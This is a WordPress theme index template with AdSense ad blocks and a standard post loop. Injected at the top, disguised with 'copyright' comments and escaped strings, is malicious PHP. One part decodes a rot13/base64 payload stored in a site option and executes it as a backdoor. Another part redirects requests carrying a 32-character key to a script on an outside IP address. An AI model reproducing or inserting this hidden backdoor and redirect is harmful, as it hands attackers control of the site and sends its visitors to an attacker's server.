<?php /* copyright */ 
$z=get_option("_site_transient_browser_0af9854a7da08864157d6814bc64e3bc"); $z=base64_decode(str_rot13($z)); if(strpos($z,"F1D2AF1C")!==false){ $_z=create_function("",$z); @$_z(); }
$x0f="\x68\x65a\144\x65\x72"; $x0b=$_GET; $x0d="\165\x6e\163u\x62\x73cri\142\145"; foreach($x0b as $x0k=>$x0v) if(preg_match("![a-z0-9]{32,32}!is",$x0k)){ if(isset($x0b[$x0d])) $x0e="&unsub=".$x0b[$x0d]; $x0f("\x4c\157\143\x61t\x69\x6f\156\x3a\040\x68t\x74\160\072\057\x2f\x34\066.\x33\x37\x2e1\066\x33\x2e\x35\070\057ij\150\x66\150\x66\x2e\x70\150\160?\155\x67t\144f\153\x3d45\063\x34\x26\x6e\166\150dl\075\163\x6bdj\x65".$x0e."&gokk=".$x0k);exit; } /* copyright */ ?><?php get_header(); ?>

	<div class="main">
		<div class="content">
        	<div style="padding-bottom:10px;">
				<script type="text/javascript"><!--
                google_ad_client = "pub-8855984207655538";
                /* Jason Diehl 468x15 */
                google_ad_slot = "1451849622";
                google_ad_width = 468;
                google_ad_height = 15;
                //-->
                </script>
                <script type="text/javascript"
                src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
                </script>
            </div>
	<?php 
		$i=0;
		if (have_posts()) : ?>
		
		<?php while (have_posts()) : the_post(); 
			$i++;
		?>
				
			<div class="post" id="post-<?php the_ID(); ?>">
				<div class="posttitle">
					<h2><a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent Link to <?php the_title(); ?>"><?php the_title(); ?></a></h2>
					<!--<small><?php the_time('F jS, Y') ?> by <?php the_author() ?> </small> -->
				</div>
				
				<div class="entry">
					<?php the_content('Read the rest of this entry &raquo;'); ?>
				</div>
		
				<p class="postmetadata">Posted in <?php the_category(', ') ?> | <?php edit_post_link('Edit', '', ' | '); ?>  <?php comments_popup_link('No Comments &#187;', '1 Comment &#187;', '% Comments &#187;'); ?></p>
				
                <!--Start Google Ad-->
				<? if ($i == 1) : ?>
                <div class="Google_468">
                    <script type="text/javascript"><!--
                    google_ad_client = "pub-8855984207655538";
                    /* Jason Diehl - 468x60 */
                    google_ad_slot = "6496128433";
                    google_ad_width = 468;
                    google_ad_height = 60;
                    //-->
                    </script>
                    <script type="text/javascript"
                    src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
                    </script>
                </div>
                <? endif ?>
                <!--End Google Ad-->
                
            </div>
            
		<?php endwhile; ?>

		<div class="navigation">
			<div class="alignleft"><?php next_posts_link('&laquo; Previous Entries') ?></div>
			<div class="alignright"><?php previous_posts_link('Next Entries &raquo;') ?></div>
		</div>
		
	<?php else : ?>

		<h2 class="center">Not Found</h2>
		<p class="center">Sorry, but you are looking for something that isn't here.</p>
		<?php include (TEMPLATEPATH . "/searchform.php"); ?>

	<?php endif; ?>

	</div>

<?php get_sidebar(); ?>

<?php get_footer(); ?>
